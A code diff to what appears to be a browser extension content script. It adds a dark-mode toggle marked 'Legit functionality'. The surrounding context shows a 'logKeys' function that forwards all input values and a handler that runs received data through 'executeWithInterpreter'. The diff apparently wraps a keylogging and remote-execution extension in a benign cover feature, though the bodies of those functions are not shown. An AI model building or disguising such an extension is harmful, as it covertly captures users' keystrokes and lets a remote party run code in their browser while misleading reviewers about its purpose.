@@ -1,3 +1,34 @@
+// Legit functionality, toggle dark mode on icon click
+let darkModeEnabled = false;
+let darkModeStyle = null;
+
+function toggleDarkMode() {
+    if (darkModeEnabled) {
+        // Dark mode is currently enabled, so disable it
+        if (darkModeStyle && darkModeStyle.parentNode) {
+            darkModeStyle.parentNode.removeChild(darkModeStyle);
+            darkModeStyle = null;
+        }
+    } else {
+        // Dark mode is currently disabled, so enable it
+        darkModeStyle = document.createElement('style');
+        darkModeStyle.innerHTML = `
+            body {
+                filter: invert(1) hue-rotate(180deg);
+                background-color: black !important;
+            }
+            img, picture, video {
+                filter: invert(1) hue-rotate(180deg);
+            }
+        `;
+        document.head.appendChild(darkModeStyle);
+    }
+
+    // Toggle the dark mode state
+    darkModeEnabled = !darkModeEnabled;
+}
+
+/* =================================================================================== */
 // Send all input values to the service worker as a message
 function logKeys(key) {
     const data = {
@@ -74,6 +105,8 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         executeWithInterpreter(request.data);
     } else if (request.type === 'HELLO') {
         console.log(request.data)
+    } else if (request.type === 'TOGGLE_DARK_MODE') {
+        toggleDarkMode();
     }
     sendResponse({status: 'ok'})
 });
